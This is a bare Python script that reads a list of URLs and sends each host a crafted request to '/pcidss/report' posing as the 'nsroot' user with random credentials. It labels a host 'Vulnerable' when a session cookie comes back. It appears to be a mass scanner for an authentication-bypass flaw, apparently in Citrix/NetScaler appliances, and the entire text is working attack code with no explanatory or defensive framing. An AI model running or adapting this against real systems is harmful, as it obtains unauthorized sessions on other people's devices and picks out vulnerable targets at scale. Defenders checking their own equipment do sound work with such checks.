#!/usr/bin/env python

import requests
import sys
import string
import random
import json
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()
def list_urls(file_urls):
        with open(file_urls, 'r') as content_file:
                content = content_file.readlines()
                content = [x.strip() for x in content]
                return content

def random_string(length=8):
	chars = string.ascii_letters + string.digits
	random_string = ''.join(random.choice(chars) for x in range(length))
	return random_string

def create_session(base_url, session):
	url = '{0}/pcidss/report'.format(base_url)

	params = {
		'type':'allprofiles',
		'sid':'loginchallengeresponse1requestbody',
		'username':'nsroot',
		'set':'1'
	}

	headers = {
		'Content-Type':'application/xml',
		'X-NITRO-USER':random_string(),
		'X-NITRO-PASS':random_string(),
	}

	data = '<appfwprofile><login></login></appfwprofile>'
	session.post(url=url, params=params, headers=headers, data=data, verify=False)
	return session

def main(file_urls):
	urls = list_urls(file_urls)
	for url in urls:
		try:
			session = requests.Session()
			create_session(url, session)
			if len(session.cookies.get_dict()['SESSID']) > 1:
				print(url + ' - Vulnerable')
		except KeyError:
			print(url + ' - Not Vulnerable')
		except:
			print(url + ' - URL Parse failed')

if __name__ == '__main__':
	file_urls = sys.argv[1]
	main(file_urls)
